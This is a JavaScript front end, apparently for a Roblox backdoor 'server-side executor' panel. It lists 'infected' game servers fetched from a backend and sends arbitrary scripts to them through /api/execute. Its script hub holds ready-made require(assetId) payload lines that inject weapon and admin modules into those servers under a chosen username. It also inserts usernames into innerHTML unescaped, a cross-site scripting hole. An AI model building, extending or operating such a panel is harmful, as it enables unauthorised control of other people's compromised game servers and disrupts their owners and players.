// ==========================================
// --- VARIABLES DE ESTADO ---
// ==========================================
let wList = JSON.parse(localStorage.getItem('wList')) || [];
let execs = parseInt(localStorage.getItem('execs')) || 0;
let wCount = parseInt(localStorage.getItem('wCount')) || 0;
let currentPage = 1; 

// ==========================================
// --- INICIALIZACIÓN ---
// ==========================================
document.addEventListener('DOMContentLoaded', () => {
    showTab('home'); 
    
    const savedTheme = localStorage.getItem('selectedTheme');
    if(savedTheme) applyTheme(savedTheme);

    updateHomeHeader();
    renderScriptHub();
    renderWhitelist();
    renderThemes(); 
    refreshGames(); 
    createParticles();
    updateStatsUI();

    // Actualizar cada 5 segundos para capturar nuevos servidores
    setInterval(refreshGames, 5000);
});

function updateStatsUI() {
    const statExecs = document.getElementById('stat-execs');
    if(statExecs) statExecs.innerText = execs;
    const statWCount = document.getElementById('stat-w-count');
    if(statWCount) statWCount.innerText = wCount;
}

// ==========================================
// --- NAVEGACIÓN ---
// ==========================================
function showTab(tabId) {
    document.querySelectorAll('.tab-content').forEach(tab => {
        tab.classList.add('hidden');
        tab.style.display = 'none'; 
    });

    const target = document.getElementById(tabId);
    if (target) {
        target.classList.remove('hidden');
        target.style.setProperty('display', (tabId === 'home' ? 'flex' : 'block'), 'important');
    }

    document.querySelectorAll('.nav-btn').forEach(btn => btn.classList.remove('active'));
    const activeBtn = document.getElementById('btn-' + tabId);
    if (activeBtn) activeBtn.classList.add('active');
}

// ==========================================
// --- SISTEMA DE SALUDO E ICONO ---
// ==========================================
function updateHomeHeader() {
    const welcomeText = document.getElementById('welcome-text');
    const userIcon = document.getElementById('user-icon');
    const activeUser = localStorage.getItem('activeUser');
    
    if (activeUser && wList.includes(activeUser)) {
        welcomeText.innerHTML = `Hi, <span class="font-bold text-white">${activeUser}</span>`;
        userIcon.src = `https://www.roblox.com/headshot-thumbnail/image?username=${encodeURIComponent(activeUser)}&width=420&height=420&format=png`;
        userIcon.onload = () => {
            userIcon.classList.remove('hidden');
            userIcon.style.display = "block";
        };
    } else {
        welcomeText.innerHTML = `Hi, <span class="font-bold text-white">random</span>`;
        if(userIcon) {
            userIcon.classList.add('hidden');
            userIcon.style.display = "none";
        }
    }
}

// ==========================================
// --- EXECUTOR ---
// ==========================================
async function runExecute() {
    const editor = document.getElementById('editor');
    const code = editor.value;
    if (!code.trim()) return notify("Put a script first! ❌", true);

    try {
        const response = await fetch('/api/execute', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ script: code })
        });

        if (response.ok) {
            execs++; 
            localStorage.setItem('execs', execs);
            updateStatsUI();
            notify("Script sent to server ✅");

            const log = document.createElement('div');
            log.className = "mb-1 border-l-2 border-green-500 pl-2 text-zinc-400 text-[10px]";
            log.innerText = `[${new Date().toLocaleTimeString()}] Sent successfully`;
            const consoleBox = document.getElementById('console');
            if(consoleBox) consoleBox.prepend(log);
        }
    } catch (err) {
        notify("Server connection error ❌", true);
    }
}

function runClear() {
    const editor = document.getElementById('editor');
    if (editor) {
        editor.value = ""; 
        notify("Textbox Cleared 🗑️");
    }
}

// ==========================================
// --- WHITELIST ---
// ==========================================
function handleWhitelist() {
    const user = document.getElementById('w-input').value.trim();
    if (!user) return notify("Enter a username! ❌", true);

    if (!wList.includes(user)) {
        wList.push(user);
        wCount++;
        localStorage.setItem('wList', JSON.stringify(wList));
        localStorage.setItem('wCount', wCount);
        renderWhitelist();
        notify("User Whitelisted ✅");
    } else {
        notify("Already Whitelisted!", true);
    }
    document.getElementById('w-input').value = "";
}

function renderWhitelist() {
    const container = document.getElementById('w-list-display');
    if (!container) return;
    let currentActive = localStorage.getItem('activeUser');

    container.innerHTML = wList.map(u => {
        const isActive = u === currentActive;
        return `
        <div class="bg-white/5 p-4 rounded-xl border ${isActive ? 'dynamic-border border-2' : 'border-white/5'} flex justify-between items-center mb-2">
            <div class="flex items-center gap-3">
                <img src="https://www.roblox.com/headshot-thumbnail/image?username=${u}&width=48&height=48&format=png" class="w-8 h-8 rounded-full border border-white/10">
                <span class="${isActive ? 'text-white font-bold' : 'text-zinc-400'}">${u}</span>
            </div>
            <button onclick="${isActive ? `deactivateUser()` : `setActiveUser('${u}')`}" 
                class="px-4 py-2 rounded-lg text-[10px] font-black uppercase transition ${isActive ? 'bg-red-500 text-white shadow-lg' : 'bg-white text-black'}">
                ${isActive ? 'Deactivate' : 'Activate'}
            </button>
        </div>
    `}).join('');
    updateStatsUI();
}

function setActiveUser(username) {
    localStorage.setItem('activeUser', username);
    updateHomeHeader();
    renderWhitelist();
    notify(`Active: ${username} ✨`);
}

function deactivateUser() {
    localStorage.removeItem('activeUser');
    updateHomeHeader();
    renderWhitelist();
    notify("User Deactivated 🔘");
}

// ==========================================
// --- NEON THEMES ---
// ==========================================
function renderThemes() {
    const grid = document.getElementById('theme-grid');
    if(!grid) return;
    const colors = ['#00ffcc', '#ff0055', '#0077ff', '#ffaa00', '#a200ff', '#00ff44', '#ff0000', '#00e1ff', '#ff00d4', '#ccff00', '#00ffa2', '#ff5e00', '#002bff', '#ff0080', '#80ff00', '#00ffea', '#ffb300', '#5500ff', '#00ff77', '#ff0022', '#00ccff', '#e1ff00', '#aa00ff', '#ff8000', '#00ff11', '#ff00aa', '#0066ff', '#22ff00', '#ff1100', '#00f2ff', '#d400ff', '#77ff00', '#0033ff', '#ffcc00', '#ffffff'];

    grid.innerHTML = colors.map(color => `
        <button onclick="applyTheme('${color}')" class="w-full aspect-square rounded-full border-2 border-white/10 hover:scale-110 transition active:scale-90" style="background:${color}"></button>
    `).join('');
}

function applyTheme(color) {
    document.documentElement.style.setProperty('--accent-color', color);
    localStorage.setItem('selectedTheme', color);
    notify(`Theme: ${color} ✨`);
}

// ==========================================
// --- SCRIPT HUB ---
// ==========================================
function renderScriptHub() {
    const container = document.getElementById('script-list');
    if(!container) return;
    
    const scripts = [
        { name: "AR-15", img: "AR-15.png", assetId: "16662828437", code: 'require(16662828437).naenae("user")' },
        { name: "Shotgun", img: "Shotgun.png", assetId: "5617600468", code: 'require(5617600468).load("user")' },
        { name: "Mr Bean Admin", img: "Mr Bean Admin.png", assetId: "16638501761", code: 'require(16638501761){Owners={"user"},Prefix=";"}' },
        { name: "Remington 870", img: "Remington 870.png", assetId: "4879817593", code: 'require(4879817593)("user")' },
        { name: "Sledge Hammer", img: "Sledge Hammer.png", assetId: "8038037940", code: 'require(8038037940).CLoad("user")' },
        { name: "CS Guns", img: "CS Guns.png", assetId: "4207271766", code: 'require(4207271766).load("user")' },
        { name: "Excavator", img: "Excavator.png", assetId: "16571914488", code: 'require(16571914488)("user")' },
        { name: "Xester", img: "Xester.png", assetId: "2918747265", code: 'require(2918747265).load("user")' },
        { name: "Grab Knife V4", img: "Grab Knife V4.png", assetId: "16662802057", code: 'require(16662802057).load("user")' },
        { name: "Stummy Guns", img: "Stummy Guns.png", assetId: "8564107139", code: 'require(8564107139)("user")' }
    ];

    container.className = "grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6";
    container.innerHTML = scripts.map(s => {
        const robloxFallback = `https://www.roblox.com/asset-thumbnail/image?assetId=${s.assetId}&width=420&height=420&format=png`;

        return `
        <div class="glass-card flex flex-col justify-between items-center h-full p-4 border border-white/5 hover:border-white/20 transition-all">
            <div class="w-full flex flex-col items-center gap-3">
                <img src="./Image scripts/${encodeURIComponent(s.img)}" 
                     onerror="this.src='${robloxFallback}'"
                     class="w-full aspect-square object-cover rounded-xl shadow-lg border border-white/10">
                <h3 class="text-lg font-bold text-white text-center">${s.name}</h3>
            </div>
            <button onclick='sendToEditor(\`${s.code}\`)' 
                class="w-full mt-4 bg-white text-black py-3 rounded-xl font-black uppercase text-[10px] hover:bg-zinc-200 active:scale-95 transition-all">
                Send to executor
            </button>
        </div>
    `}).join('');
}

function sendToEditor(code) {
    const active = localStorage.getItem('activeUser') || "user";
    let finalCode = code.replace(/"user"/g, `"${active}"`).replace(/'user'/g, `'${active}'`);
    
    const editor = document.getElementById('editor');
    if(editor) {
        editor.value = finalCode;
        showTab('executor');
        notify("Loaded in Editor 📂");
    }
}

// ==========================================
// --- GAMES (PERSISTENCIA TOTAL SS) ---
// ==========================================
async function refreshGames() {
    const container = document.getElementById('games-container');
    const statGames = document.getElementById('stat-games');
    if(!container) return;

    try {
        const response = await fetch('/api/games?t=' + Date.now());
        
        // Cargamos la base de datos guardada en el navegador
        let persistentDB = JSON.parse(localStorage.getItem('ss_total_db')) || [];

        if (response.ok) {
            const serverGames = await response.json();

            // Si el servidor detecta juegos, los guardamos en el almacenamiento local
            if (Array.isArray(serverGames) && serverGames.length > 0) {
                serverGames.forEach(newG => {
                    const index = persistentDB.findIndex(saved => saved.jobId === newG.jobId);
                    if (index === -1) {
                        persistentDB.unshift(newG); // Si es nuevo, va al principio
                    } else {
                        persistentDB[index] = newG; // Si ya existe, actualizamos datos
                    }
                });
                // Guardamos la lista "blindada" en el localStorage
                localStorage.setItem('ss_total_db', JSON.stringify(persistentDB));
            }
        }

        // Siempre usamos persistentDB para renderizar, así nunca se queda vacío
        if(statGames) statGames.innerText = persistentDB.length;

        if (persistentDB.length > 0) {
            const gamesPerPage = 15;
            const totalPages = Math.ceil(persistentDB.length / gamesPerPage);
            const start = (currentPage - 1) * gamesPerPage;
            const end = start + gamesPerPage;
            const paginatedGames = persistentDB.slice(start, end);

            container.innerHTML = paginatedGames.map(g => {
                const robloxLink = `https://www.roblox.com/games/${g.gameId}`;
                const thumb = `https://www.roblox.com/asset-thumbnail/image?assetId=${g.gameId}&width=150&height=150&format=png`;
                
                return `
                <div class="glass-card flex flex-col justify-between p-6 border-l-4 dynamic-border" style="display: flex !important;">
                    <div class="flex items-center gap-4">
                        <img src="${thumb}" 
                             onerror="this.src='https://tr.rbxcdn.com/38c353386000e311a268e37d97745778/150/150/Image/Png'"
                             class="w-14 h-14 rounded-lg border border-white/10 object-cover">
                        <div class="overflow-hidden">
                            <h3 class="text-lg font-bold text-white truncate">${g.name || 'Infected Server'}</h3>
                            <p class="text-zinc-500 text-[10px]">ID: ${g.gameId}</p>
                        </div>
                    </div>
                    <div class="flex items-center justify-between mt-4">
                        <span class="text-[9px] bg-green-500/20 text-green-400 px-2 py-1 rounded-md font-bold uppercase">🟢 ${g.players || 0} Players</span>
                        <a href="${robloxLink}" target="_blank" class="text-[10px] font-black uppercase dynamic-color hover:opacity-80 transition-all cursor-pointer">
                            Select Server ↗
                        </a>
                    </div>
                </div>`;
            }).join('');

            if (totalPages > 1) {
                const nav = document.createElement('div');
                nav.className = "col-span-full flex justify-center gap-4 mt-6";
                nav.innerHTML = `
                    <button onclick="changePage(-1)" class="px-4 py-2 bg-white/10 rounded-lg text-white ${currentPage === 1 ? 'opacity-30 pointer-events-none' : ''}">Prev</button>
                    <span class="text-white self-center text-sm">Page ${currentPage} of ${totalPages}</span>
                    <button onclick="changePage(1)" class="px-4 py-2 bg-white/10 rounded-lg text-white ${currentPage === totalPages ? 'opacity-30 pointer-events-none' : ''}">Next</button>
                `;
                container.appendChild(nav);
            }
        } else {
            container.innerHTML = '<p class="text-zinc-500 py-10 text-center col-span-full">No games infected yet.</p>';
        }
    } catch (err) {
        console.error("Fetch error:", err);
    }
}

// Para limpiar la lista manualmente si se llena de basura
function clearGamesList() {
    if(confirm("¿Borrar todos los servidores guardados?")) {
        localStorage.removeItem('ss_total_db');
        refreshGames();
        notify("List Cleared 🗑️");
    }
}

function changePage(step) {
    currentPage += step;
    refreshGames();
}

// ==========================================
// --- UTILIDADES ---
// ==========================================
function notify(text, isError = false) {
    const area = document.getElementById('notif-area');
    if(!area) return;
    const n = document.createElement('div');
    n.className = `notif-bubble ${isError ? 'bg-red-500/20 border-red-500 text-red-200' : 'bg-green-500/20 border-green-500 text-green-200'} px-6 py-3 rounded-2xl border backdrop-blur-md shadow-lg transition-all duration-300 mb-2`;
    n.innerText = text;
    area.appendChild(n);
    setTimeout(() => { 
        n.style.opacity = '0'; 
        setTimeout(() => n.remove(), 300); 
    }, 3000);
}

function createParticles() {
    const bg = document.getElementById('bg-particles');
    if(!bg) return;
    for(let i=0; i<30; i++) {
        const p = document.createElement('div');
        p.className = 'falling-item';
        p.style.left = Math.random() * 100 + 'vw';
        p.style.animationDuration = (Math.random() * 3 + 4) + 's';
        p.style.animationDelay = Math.random() * 5 + 's';
        bg.appendChild(p);
    }
}
